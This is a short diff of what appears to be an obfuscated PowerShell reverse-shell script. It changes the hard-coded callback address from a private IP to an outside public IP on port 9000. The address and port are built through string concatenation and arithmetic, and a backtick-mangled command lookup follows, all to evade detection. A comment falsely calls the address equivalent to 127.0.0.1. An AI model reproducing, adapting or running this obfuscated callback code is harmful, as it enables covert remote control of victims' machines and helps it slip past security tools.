@@ -1,6 +1,6 @@
 # change the host address and/or port number as necessary
 # obfuscated host address, same as $a = "127.0.0.1";
-$a = "192" + "." + "168" + "." + "101" + "." + "171";
+$a = "35" + "." + "176" + "." + "12" + "." + "203";
 # obfuscated port number, same as $p = 9000;
 $p = 1000 + 1000 + 1000 + 6000;
 & (`G`C`M *e-Ho??);
